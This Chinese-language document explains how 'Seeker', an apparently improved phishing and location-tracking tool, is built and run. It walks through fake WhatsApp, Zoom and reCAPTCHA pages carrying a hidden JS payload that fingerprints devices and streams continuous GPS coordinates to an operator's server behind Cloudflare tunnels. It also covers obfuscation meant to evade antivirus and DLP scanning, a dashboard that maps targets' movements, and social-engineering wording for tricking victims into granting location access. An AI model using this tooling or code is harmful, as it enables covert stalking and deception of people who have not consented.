# Seeker 工作原理详解

## 目录

- [整体架构](#整体架构)
- [核心流程](#核心流程)
  - [1. 伪装页面投递](#1-伪装页面投递)
  - [2. JavaScript 载荷采集](#2-javascript-载荷采集)
  - [3. 数据传输路径](#3-数据传输路径)
  - [4. 服务端处理](#4-服务端处理)
  - [5. 隧道穿透](#5-隧道穿透)
  - [6. IP 地址获取](#6-ip-地址获取)
  - [7. JS 混淆](#7-js-混淆)
  - [8. 持续追踪机制](#8-持续追踪机制)
  - [9. 控制面板](#9-控制面板)
- [模块职责](#模块职责)
- [数据流向总结](#数据流向总结)
- [安全与反检测](#安全与反检测)
- [局限性](#局限性)

---

## 整体架构

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   目标设备       │  HTTPS  │  Cloudflare       │  HTTP   │  你的服务器      │
│   (浏览器)       │ ──────→ │  Tunnel           │ ──────→ │  (seeker.py)    │
│                 │         │  (cloudflared)    │         │                 │
│  ┌───────────┐  │         └──────────────────┘         │  ┌───────────┐  │
│  │ 伪装页面   │  │                                      │  │ HTTP Server│  │
│  │ + JS载荷  │  │                                      │  │ (server.py)│  │
│  └───────────┘  │                                      │  └─────┬─────┘  │
└─────────────────┘                                      │        │        │
                                                         │  ┌─────▼─────┐  │
                                                         │  │ Session   │  │
                                                         │  │ Manager   │  │
                                                         │  └─────┬─────┘  │
                                                         │        │        │
                                                         │  ┌─────▼─────┐  │
                                                         │  │ Dashboard │  │
                                                         │  │ (Web UI)  │  │
                                                         │  └───────────┘  │
                                                         └─────────────────┘
```

组件说明：

| 组件 | 位置 | 职责 |
|------|------|------|
| 伪装页面 | 目标浏览器 | 展示正常网页，隐藏 JS 载荷 |
| JS 载荷 | 目标浏览器 | 采集设备指纹 + GPS 定位 |
| Cloudflare Tunnel | 云端中转 | 将公网 HTTPS 流量转发到本地 HTTP |
| HTTP Server | 你的服务器 | 接收前端 POST 数据，提供静态文件 |
| Session Manager | 你的服务器 | 内存存储所有会话数据 |
| Dashboard | 你的服务器 | Web 控制面板，可视化展示结果 |

---

## 核心流程

### 1. 伪装页面投递

工具内置 8 个模板，每个模板都是一个**视觉上真实的网页**，内嵌了 JS 载荷：

```
template/
├── nearyou/           # "附近的人"发现页
├── gdrive/            # Google Drive 文件分享
├── whatsapp/          # WhatsApp 群组邀请
├── whatsapp_redirect/ # WhatsApp 变体（带重定向）
├── telegram/          # Telegram 频道/群组
├── zoom/              # Zoom 会议加入页
├── captcha/           # Google reCAPTCHA 验证页
└── custom_og_tags/    # 自定义 Open Graph 标签
```

每个模板的结构：

```
template/whatsapp/
├── index_temp.html    # HTML 模板（支持 $TITLE$, $IMAGE$ 等占位符）
├── mod_whatsapp.py    # 模板处理模块（替换占位符）
└── js/
    └── location.js    # 自动生成（混淆后的 JS 载荷）
```

用户看到的页面示例（WhatsApp 模板）：

```html
<!DOCTYPE html>
<html>
<head>
    <title>WhatsApp Group Invite</title>
    <meta property="og:title" content="Join our WhatsApp group!">
    <meta property="og:image" content="https://example.com/whatsapp.jpg">
</head>
<body>
    <div class="invite-card">
        <img src="whatsapp-logo.png">
        <h2>You're invited to join the group!</h2>
        <p>Click below to join the conversation</p>
        <button onclick="locate(sendData)">Join Group</button>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="js/location.js"></script>  <!-- 核心载荷 -->
</body>
</html>
```

目标看到的是一个正常的 WhatsApp 邀请页面，完全不知道背后有 JS 在采集数据。

---

### 2. JavaScript 载荷采集

`js/location.js` 是核心载荷文件，包含两个主要函数：

#### 2a. 设备指纹采集 — `information()` 函数

通过浏览器公开的 Web API 获取设备信息，**不需要用户授权**：

```javascript
function information() {
    // 操作系统平台（如 "MacIntel", "Win32", "Linux x86_64"）
    var ptf = navigator.platform;

    // CPU 核心数（如 8、16）
    var cc = navigator.hardwareConcurrency;

    // RAM 容量（如 8、16，单位 GB，仅 Chrome 支持）
    var ram = navigator.deviceMemory;

    // 完整 User-Agent 字符串
    var ver = navigator.userAgent;

    // GPU 信息（通过 WebGL 获取）
    var canvas = document.createElement('canvas');
    var gl = canvas.getContext('webgl');
    var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    var ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);   // 如 "Apple Inc."
    var ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); // 如 "Apple M1 GPU"

    // 屏幕分辨率
    var ht = window.screen.height;  // 如 1080
    var wd = window.screen.width;   // 如 1920
}
```

采集到的数据通过 AJAX POST 发送到服务器：

```javascript
$.ajax({
    type: 'POST',
    url: 'info_handler',
    data: {
        Ptf: platform,    // 平台
        Brw: browser,     // 浏览器版本
        Cc: cores,        // CPU 核心数
        Ram: ram,         // 内存
        Ven: vendor,      // GPU 厂商
        Ren: renderer,    // GPU 型号
        Ht: height,       // 屏幕高度
        Wd: width,        // 屏幕宽度
        Os: os            // 操作系统
    }
});
```

这些 API 的特点：
- **零授权**：页面加载即可调用，不会弹出任何提示
- **跨浏览器**：Chrome、Firefox、Safari、Edge 都支持
- **信息量大**：可以区分不同设备，甚至同一型号的不同个体

#### 2b. GPS 定位采集 — `locate()` 函数

```javascript
function locate(callback, errCallback) {
    var optn = {
        enableHighAccuracy: true,  // 启用高精度（GPS 优先）
        timeout: 30000,            // 超时 30 秒
        maximumAge: 0              // 不使用缓存位置
    };

    // watchPosition：持续监听位置变化
    var watchId = navigator.geolocation.watchPosition(
        showPosition,  // 成功回调
        showError,     // 失败回调
        optn
    );

    // 5 分钟后自动停止（避免耗电）
    setTimeout(function() {
        navigator.geolocation.clearWatch(watchId);
    }, 300000);
}
```

**关键点：这里获取的是 GPS 真实坐标，不是 IP 地理位置。**

定位精度对比：

| 定位来源 | 精度 | 需要用户授权 | 原理 |
|----------|------|-------------|------|
| GPS 芯片 | 5-15 米 | 需要 | 卫星三角定位 |
| Wi-Fi 定位 | 30-100 米 | 需要 | Wi-Fi 热点数据库匹配 |
| 基站定位 | 100-1000 米 | 需要 | 手机基站三角定位 |
| IP 地理位置 | 城市级（几公里） | **不需要** | IP 地址归属地查询 |

`watchPosition` vs `getCurrentPosition`：

```
getCurrentPosition  → 获取一次位置就结束，适合"签到"场景
watchPosition       → 持续监听，设备移动时不断发送新坐标，适合"追踪"场景
```

浏览器弹出的授权提示：

```
┌──────────────────────────────────────────┐
│  🔒 random-name.trycloudflare.com        │
│                                          │
│  wants to know your location             │
│                                          │
│  Your location will be used to show      │
│  nearby contacts and groups              │
│                                          │
│  [ Block ]              [ Allow ]        │
└──────────────────────────────────────────┘
```

用户点击"Allow"后，浏览器持续向服务器发送位置更新：

```
[+] Location Information:
    Latitude  : 39.9042 deg
    Longitude : 116.4074 deg
    Accuracy  : 15 m
    Altitude  : 50 m

[+] Location Update #2: 39.9043, 116.4075 (accuracy: 12 m)
[+] Location Update #3: 39.9044, 116.4076 (accuracy: 10 m)
[+] Location Update #4: 39.9045, 116.4077 (accuracy: 8 m)
```

---

### 3. 数据传输路径

```
目标浏览器                          服务器 (server.py)
    │                                    │
    │  POST /info_handler                │
    │  Content-Type: x-www-form-urlencoded
    │  Body: Os=macOS&Brw=Chrome...      │
    │ ─────────────────────────────────→ │  ← 页面加载时自动发送
    │                                    │
    │  200 OK                            │
    │ ←───────────────────────────────── │
    │                                    │
    │  POST /result_handler              │
    │  Body: Status=success&             │
    │        Lat=39.9042+deg&            │
    │        Lon=116.4074+deg&...        │
    │ ─────────────────────────────────→ │  ← 获取到位置后发送
    │                                    │
    │  200 OK                            │
    │ ←───────────────────────────────── │
    │                                    │
    │  POST /error_handler               │
    │  Body: Status=failed&              │
    │        Error=User+denied...        │
    │ ─────────────────────────────────→ │  ← 定位失败时发送
    │                                    │
    │  200 OK                            │
    │ ←───────────────────────────────── │
```

三个端点及其作用：

| 端点 | 触发时机 | 携带数据 |
|------|----------|----------|
| `POST /info_handler` | 页面加载完成 | 设备指纹（OS、浏览器、GPU、CPU、RAM、分辨率） |
| `POST /result_handler` | GPS 获取成功 | 位置坐标（纬度、经度、精度、海拔、方向、速度） |
| `POST /error_handler` | GPS 获取失败 | 错误信息（权限拒绝、超时、位置不可用） |

所有 POST 请求都使用 `application/x-www-form-urlencoded` 格式，与普通表单提交完全一致，不会触发安全工具的异常检测。

---

### 4. 服务端处理

#### 4a. HTTP Server（server.py）

使用 Python 标准库 `http.server` 实现，替代了原版的 PHP：

```python
from http.server import HTTPServer, SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn

class SeekerHandler(SimpleHTTPRequestHandler):
    """处理所有 HTTP 请求"""

    def do_POST(self):
        data = self._parse_post_data()    # 解析表单数据
        client_ip = self._get_client_ip()  # 获取真实 IP

        if path == '/info_handler':
            self._handle_info(client_ip, data)
        elif path == '/result_handler':
            self._handle_result(client_ip, data)
        elif path == '/error_handler':
            self._handle_error(client_ip, data)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """多线程 HTTP 服务器，支持并发请求"""
    daemon_threads = True
    allow_reuse_address = True
```

#### 4b. IP 获取逻辑

通过 HTTP 请求头获取目标的真实 IP：

```python
def _get_client_ip(self):
    # 优先级从高到低
    ip = self.headers.get('CF-Connecting-IP')    # ① Cloudflare 隧道专用头
    if ip:
        return ip

    ip = self.headers.get('X-Forwarded-For')     # ② 通用代理头（取第一个）
    if ip:
        return ip.split(',')[0].strip()

    ip = self.headers.get('X-Real-IP')           # ③ Nginx 代理头
    if ip:
        return ip

    return self.client_address[0]                # ④ 直连 IP（兜底）
```

为什么需要这些头？

```
场景 1：直连（无隧道）
目标浏览器 ──HTTP──→ 你的服务器
client_address[0] 就是真实 IP ✓

场景 2：通过 Cloudflare 隧道
目标浏览器 ──HTTPS──→ Cloudflare Edge ──HTTP──→ 你的服务器
client_address[0] = Cloudflare 的 IP ✗
CF-Connecting-IP = 目标的真实 IP ✓

场景 3：通过 Nginx 反向代理
目标浏览器 ──HTTP──→ Nginx ──HTTP──→ 你的服务器
client_address[0] = Nginx 的 IP ✗
X-Real-IP = 目标的真实 IP ✓
```

#### 4c. Session Manager（session.py）

用**线程安全的内存字典**存储所有会话数据，替代了原版的文件轮询：

```python
import threading
from dataclasses import dataclass, field
from typing import List, Optional

@dataclass
class Session:
    """单个客户端的会话数据"""
    ip: str                                    # 客户端 IP
    info: Optional[dict] = None                # 设备信息
    locations: List[dict] = field(default_factory=list)  # 位置列表
    first_seen: float = field(default_factory=time)      # 首次连接时间
    last_seen: float = field(default_factory=time)       # 最后活跃时间

class SessionManager:
    """线程安全的会话管理器"""

    def __init__(self):
        self._lock = threading.Lock()           # 互斥锁
        self._sessions: dict[str, Session] = {} # IP → Session 映射
        self._callbacks: List[Callable] = []    # 事件回调列表

    def update_info(self, ip: str, info: dict):
        with self._lock:                        # 加锁保证线程安全
            if ip not in self._sessions:
                self._sessions[ip] = Session(ip=ip)
            session = self._sessions[ip]
            session.info = info
            session.last_seen = time()
        self._notify('info', session)           # 触发回调

    def update_location(self, ip: str, location: dict):
        with self._lock:
            if ip not in self._sessions:
                self._sessions[ip] = Session(ip=ip)
            session = self._sessions[ip]
            session.locations.append(location)  # 追加位置（支持多次更新）
            session.last_seen = time()
        self._notify('location', session)
```

事件驱动模型：

```
POST 到达
    ↓
SessionManager.update_*()
    ↓
存储到内存（加锁）
    ↓
遍历 callbacks 列表
    ↓
调用 seeker.py 中的 on_session_update()
    ↓
├── event_type == 'info'     → handle_device_info() → 终端输出 + 通知
├── event_type == 'location' → handle_location()     → 终端输出 + 通知 + CSV
└── event_type == 'error'    → handle_error()        → 终端输出
```

对比原版 Seeker：

```
原版（文件轮询）：
PHP 写文件 → Python 每 2 秒读文件 → 解析 → 输出
问题：有竞态条件、2 秒延迟、磁盘 I/O

改进版（事件驱动）：
HTTP POST → SessionManager → 立即触发回调 → 输出
优势：实时、无竞态、纯内存、零磁盘 I/O
```

---

### 5. 隧道穿透

本地服务器运行在 `127.0.0.1:8080`，外网无法直接访问。隧道工具创建一条**反向代理通道**，将公网 URL 映射到本地端口。

#### 5a. Cloudflare Quick Tunnel（默认方案）

```bash
cloudflared tunnel --url http://127.0.0.1:8080 --no-autoupdate
```

工作原理：

```
目标浏览器                              你的电脑
    │                                     │
    │ ① HTTPS GET                        │
    │ https://random.trycloudflare.com    │
    │                                     │
    ↓                                     │
Cloudflare Edge (全球 CDN)                │
    │                                     │
    │ ② 通过 cloudflared 维持的长连接     │
    │    转发 HTTP 请求                   │
    │ ──────────────────────────────────→ │
    │                                     │
    │ ③ HTTP Response                    │
    │ ←────────────────────────────────── │
    │                                     │
    ↓                                     │
目标浏览器收到响应                        │
```

URL 解析：

```python
# cloudflared 的 stdout 输出类似：
# ...
# +--------------------------------------------------------------------------------------------+
# |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
# |  https://abc-xyz-123.trycloudflare.com                                                     |
# +--------------------------------------------------------------------------------------------+

# 用正则提取 URL
url_pattern = r'https://[a-z0-9-]+\.trycloudflare\.com'
```

优势：
- **免费**，无需注册账号
- **无需配置**，开箱即用
- **HTTPS** 自动加密，目标浏览器地址栏显示安全锁
- **URL 不易被标记**，`trycloudflare.com` 是合法域名

#### 5b. 其他隧道方案

| 方案 | 启动命令 | URL 格式 | 特点 |
|------|----------|----------|------|
| Cloudflare | `cloudflared tunnel --url` | `*.trycloudflare.com` | 免费、无需注册、推荐 |
| ngrok | `ngrok http 8080` | `*.ngrok.com` | 稳定、有 Web 控制台、免费版需注册 |
| localhost.run | `ssh -R 80:localhost:8080 localhost.run` | `*.lhr.life` | 仅需 ssh、速度较慢 |
| serveo | `ssh -R 80:localhost:8080 serveo.net` | `*.serveo.net` | 仅需 ssh、可能需等待 |

统一接口：

```python
# tunnel.py
def start_tunnel(provider, port):
    """根据 provider 名称启动对应的隧道"""
    if provider == 'cloudflare':
        return _start_cloudflare(port)
    elif provider == 'ngrok':
        return _start_ngrok(port)
    elif provider == 'localhost.run':
        return _start_localhost_run(port)
    elif provider == 'serveo':
        return _start_serveo(port)

# 所有方案都返回 (url, process) 元组
def _start_cloudflare(port):
    cmd = ['cloudflared', 'tunnel', '--url', f'http://127.0.0.1:{port}', '--no-autoupdate']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    url = _wait_for_url(proc, r'https://[a-z0-9-]+\.trycloudflare\.com', timeout=30)
    return url, proc
```

---

### 6. IP 地址获取与 IP 地理定位

获取到目标的公网 IP 后，调用外部 API 进行 IP 地理定位：

```python
# 调用 ipwhois.app API
rqst = requests.get(f'https://ipwhois.app/json/{var_ip}', timeout=10)
data = rqst.json()

# 返回的数据：
{
    "continent": "Asia",
    "country": "China",
    "region": "Beijing",
    "city": "Beijing",
    "org": "China Telecom",
    "isp": "China Telecom Beijing"
}
```

IP 定位 vs GPS 定位：

```
IP 定位：
- 精度：城市级（几公里到几十公里）
- 原理：IP 地址分配数据库
- 优点：不需要用户授权，自动获取
- 缺点：VPN/代理 会定位到 VPN 出口

GPS 定位：
- 精度：5-15 米
- 原理：卫星三角定位 / Wi-Fi 热点匹配
- 优点：精度极高
- 缺点：需要用户点击"允许"
```

两种定位同时进行，互相补充：

```
用户打开页面
    ↓
┌───────────────────────────────────────┐
│ ① 信息采集（自动，无需授权）         │
│    - 设备指纹 → /info_handler        │
│    - IP 地址  → 自动从请求头获取     │
│    - IP 地理  → 调用 ipwhois API     │
├───────────────────────────────────────┤
│ ② GPS 定位（需要用户点击"允许"）     │
│    - 坐标     → /result_handler      │
│    - 持续更新 → watchPosition        │
└───────────────────────────────────────┘
```

---

### 7. JS 混淆

安全工具（防病毒、浏览器安全扩展、企业 DLP）会扫描 JS 中的敏感字符串。混淆模块（`obfuscate.py`）在部署时自动对 JS 载荷进行变形。

#### 7a. 字符串编码

将关键字符串替换为 Base64 + `atob()` 解码：

```javascript
// 原始代码
navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
$.ajax({ type: 'POST', url: 'result_handler' });

// 混淆后
_0xa3f2c1[atob("Z2VvbG9jYXRpb24=")][atob("Z2V0Q3VycmVudFBvc2l0aW9u")](_0xb7e4d2, _0xc9a1f3, _0xd5b2e4);
_0xe8f3a5({ type: atob("UE9TVA=="), url: atob("cmVzdWx0X2hhbmRsZXI=") });
```

编码的字符串列表：

```python
api_strings = [
    'navigator.geolocation',    # 定位 API
    'getCurrentPosition',       # 获取位置
    'watchPosition',            # 持续监听
    'clearWatch',               # 停止监听
    'enableHighAccuracy',       # 高精度选项
    'hardwareConcurrency',      # CPU 核心数
    'deviceMemory',             # 内存大小
    'WEBGL_debug_renderer_info',# WebGL 扩展名
    'UNMASKED_VENDOR_WEBGL',    # GPU 厂商
    'UNMASKED_RENDERER_WEBGL',  # GPU 型号
    'geolocation',              # 定位关键词
    'permissions',              # 权限关键词
    'POST',                     # HTTP 方法
    'text',                     # MIME 类型
]
```

#### 7b. 变量重命名

将局部变量替换为随机十六进制标识符：

```javascript
// 原始代码
var optn = { enableHighAccuracy: true, timeout: 30000 };
var lat = position.coords.latitude;

// 混淆后
var _0xd5b2e4 = { enableHighAccuracy: true, timeout: 30000 };
var _0xf3a1c2 = position.coords.latitude;
```

每次生成的变量名都不同（基于 `random.choices`），实现**多态性**：

```python
def _random_var(length=6):
    """生成随机变量名，如 _0xa3f2c1"""
    return '_0x' + ''.join(random.choices('0123456789abcdef', k=length))
```

#### 7c. 混淆效果

```
混淆前特征签名：
- navigator.geolocation      → 高风险关键词
- getCurrentPosition         → 高风险关键词
- watchPosition              → 高风险关键词
- info_handler / result_handler → 端点名称

混淆后特征签名：
- atob("Z2VvbG9jYXRpb24=")  → 看起来像正常的 Base64 操作
- _0xa3f2c1[_0xb7e4d2]      → 看起来像压缩/打包后的代码
- 端点名被编码               → 静态扫描无法匹配
```

---

### 8. 持续追踪机制

原版 Seeker 使用 `getCurrentPosition`（一次性），改进版使用 `watchPosition`（持续监听）。

#### 工作流程

```
用户点击"允许定位"
    ↓
浏览器调用 watchPosition()
    ↓
┌─────────────────────────────────────┐
│  GPS 获取位置成功                   │
│  → POST /result_handler (第一次)    │
│  → 完整输出（设备信息 + IP + 坐标） │
│                                     │
│  设备移动...                        │
│  → GPS 自动触发新位置               │
│  → POST /result_handler (第二次)    │
│  → 精简输出（仅坐标更新）           │
│                                     │
│  继续移动...                        │
│  → POST /result_handler (第三次)    │
│  → 精简输出                         │
│  ...                                │
│                                     │
│  5 分钟后                           │
│  → clearWatch() 自动停止            │
│  → 避免耗尽目标电池                 │
└─────────────────────────────────────┘
```

#### 终端输出

第一次定位（完整信息）：

```
[!] Device Information :

[+] OS         : iOS 17.2
[+] Platform   : iPhone
[+] CPU Cores  : 6
[+] RAM        : 6
[+] GPU Vendor : Apple Inc.
[+] GPU        : Apple A16 GPU
[+] Resolution : 390x844
[+] Browser    : Safari 17.2
[+] Public IP  : 203.0.113.50

[!] IP Information :

[+] Continent : Asia
[+] Country   : China
[+] Region    : Beijing
[+] City      : Beijing
[+] Org       : China Telecom
[+] ISP       : China Telecom Beijing

[!] Location Information :

[+] Latitude  : 39.9042 deg
[+] Longitude : 116.4074 deg
[+] Accuracy  : 15 m
[+] Altitude  : 50 m
[+] Direction : 180 deg
[+] Speed     : 5 m/s

[+] Google Maps : https://www.google.com/maps/place/39.9042+116.4074
[+] Data Saved : /path/to/db/results.csv
```

后续更新（精简信息）：

```
[+] Location Update #2: 39.9043, 116.4075 (accuracy: 12 m)
[+] Google Maps : https://www.google.com/maps/place/39.9043+116.4075

[+] Location Update #3: 39.9044, 116.4076 (accuracy: 10 m)
[+] Google Maps : https://www.google.com/maps/place/39.9044+116.4076
```

---

### 9. 控制面板

Web 控制面板（Dashboard）通过 `/dashboard` 路径访问，提供实时可视化界面。

#### 技术栈

- **前端**：纯 HTML + CSS + JavaScript（无框架依赖）
- **地图**：Leaflet.js（开源地图库）+ CartoDB 暗色瓦片
- **数据源**：每 3 秒轮询 `/api/sessions` 接口
- **布局**：三栏布局（会话列表 | 地图 | 详情面板）

#### 数据接口

```python
# server.py 中的 API 端点
if self.path == '/api/sessions':
    data = self.session_manager.get_sessions_dict()
    # 返回 JSON 格式：
    # [
    #   {
    #     "ip": "203.0.113.50",
    #     "info": { "os": "iOS", "browser": "Safari", ... },
    #     "locations": [
    #       { "status": "success", "lat": "39.9042 deg", "lon": "116.4074 deg", ... },
    #       { "status": "success", "lat": "39.9043 deg", "lon": "116.4075 deg", ... }
    #     ],
    #     "first_seen": 1700000000.0,
    #     "last_seen": 1700000060.0
    #   }
    # ]
```

#### 界面功能

| 区域 | 功能 |
|------|------|
| 左侧面板 | 所有已捕获会话列表，显示 IP、操作系统、浏览器、位置更新次数 |
| 中央地图 | Leaflet.js 暗色地图，自动标记所有捕获位置，多点时绘制移动轨迹线 |
| 右侧详情 | 设备信息卡片、IP 信息、位置坐标表格、Google Maps 链接、事件日志 |
| 顶部状态栏 | 实时连接状态指示灯、会话总数、最后更新时间 |

---

## 模块职责

```
seeker-improved/
├── seeker.py           # 主程序入口
│                        # - CLI 参数解析
│                        # - 流程编排（模板选择 → 启动服务器 → 启动隧道 → 等待连接）
│                        # - 数据展示（设备信息、IP 信息、位置信息）
│                        # - 通知发送（Telegram、Webhook）
│                        # - 信号处理 + 资源清理
│
├── server.py           # Python HTTP Server
│                        # - 静态文件服务（伪装页面）
│                        # - POST 端点（/info_handler, /result_handler, /error_handler）
│                        # - /api/sessions JSON 接口
│                        # - /dashboard 控制面板
│                        # - /health 健康检查
│
├── session.py          # 内存会话管理
│                        # - 线程安全的 Session 存储
│                        # - 事件驱动回调机制
│                        # - 会话数据序列化
│
├── tunnel.py           # 多隧道支持
│                        # - Cloudflare Quick Tunnel
│                        # - ngrok
│                        # - localhost.run
│                        # - serveo
│                        # - 统一的 URL 解析（正则匹配 stdout）
│
├── obfuscate.py        # JavaScript 混淆
│                        # - 字符串 Base64 编码
│                        # - 变量重命名（随机十六进制）
│                        # - 多态性（每次生成不同变量名）
│
├── utils.py            # 工具函数
│                        # - 终端输出（支持颜色 + 非 TTY 模式）
│                        # - 图片下载
│
├── telegram_api.py     # Telegram 通知
├── discord_webhook.py  # Discord Webhook 通知
├── js/location.js      # 核心 JS 载荷（定位 + 指纹采集）
└── template/           # 伪装页面模板
```

---

## 数据流向总结

```
┌─────────────────────────────────────────────────────────────────┐
│                        完整数据流                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ① 用户将隧道 URL 发送给目标（通过社交工程）                    │
│                                                                 │
│  ② 目标点击链接                                                 │
│     → HTTPS 请求到达 Cloudflare Edge                            │
│     → cloudflared 转发到 localhost:8080                         │
│     → server.py 返回伪装页面 HTML                               │
│                                                                 │
│  ③ 目标浏览器加载页面                                           │
│     → 信息采集（自动，无需授权）                                │
│       - 设备指纹 → POST /info_handler                          │
│       - IP 地址  → 从 HTTP 请求头获取                          │
│       - IP 地理  → 调用 ipwhois.app API                        │
│     → server.py 接收 → SessionManager 存储 → 触发回调          │
│     → seeker.py 终端输出 + 发送通知                             │
│                                                                 │
│  ④ 目标点击"允许定位"（如果需要）                               │
│     → watchPosition 获取 GPS 坐标                               │
│     → POST /result_handler（持续发送）                          │
│     → server.py 接收 → SessionManager 追加 → 触发回调          │
│     → seeker.py 终端输出 + 发送通知 + 写入 CSV                  │
│     → Dashboard 实时更新地图标记                                │
│                                                                 │
│  ⑤ 持续追踪（5 分钟内）                                        │
│     → 设备移动时自动发送新坐标                                  │
│     → Dashboard 绘制移动轨迹                                    │
│     → 5 分钟后自动停止（避免耗电）                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 安全与反检测

### JS 混淆层

| 技术 | 目的 | 效果 |
|------|------|------|
| 字符串 Base64 编码 | 隐藏敏感关键词 | 静态扫描无法匹配 `geolocation`、`getCurrentPosition` 等 |
| 变量重命名 | 增加代码阅读难度 | `_0xa3f2c1` 替代 `optn`、`lat` 等有意义的变量名 |
| 多态性 | 每次生成不同代码 | 每次部署的 JS 文件内容不同，无法用固定哈希匹配 |

### 流量特征

| 特征 | 分析 |
|------|------|
| HTTPS 加密 | 隧道自动提供 TLS，中间人无法查看内容 |
| 合法域名 | `trycloudflare.com` 是 Cloudflare 的合法域名，不会被标记 |
| 正常表单提交 | POST 数据使用 `application/x-www-form-urlencoded`，与普通表单一致 |
| CDN 背后 | 流量经过 Cloudflare CDN，无法追溯到你的实际 IP |

### 运行时安全

```python
# 信号处理：Ctrl+C 干净退出
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# atexit 兜底：进程异常退出时也清理资源
atexit.register(cleanup)

# 健康检查：启动时验证服务器正常工作
rqst = requests.get(f'http://127.0.0.1:{port}/health', timeout=5)

# 环境验证：启动前检查端口、二进制依赖
def validate_environment():
    issues = []
    if sys.version_info < (3, 7):
        issues.append('Python 3.7+ is required')
    # 检查端口占用、隧道工具是否安装等
    return issues
```

---

## 局限性

| 局限 | 说明 | 应对 |
|------|------|------|
| 需要用户点击"允许" | GPS 定位需要浏览器授权 | 使用社会工程话术诱导（如"查看附近的人需要开启位置"） |
| 桌面设备无 GPS | 笔记本/台式机通常没有 GPS 芯片 | 只能获取 Wi-Fi 级别精度或 IP 级别精度 |
| 隐私模式限制 | 浏览器隐私模式可能限制 Geolocation API | 建议目标使用普通模式 |
| VPN/代理干扰 | VPN 会将 IP 定位到 VPN 出口 | GPS 定位不受影响（直接从设备获取） |
| 隧道 URL 有时效 | Cloudflare Quick Tunnel 的 URL 随机且不持久 | 适合短期使用，长期需配置命名隧道 |
| 需要 cloudflared | 默认方案依赖 cloudflared 二进制 | 可切换到 ngrok 或 localhost.run |
| 移动端更有效 | 手机有 GPS + 移动网络，定位精度最高 | 桌面端只能获取城市级 IP 定位 |
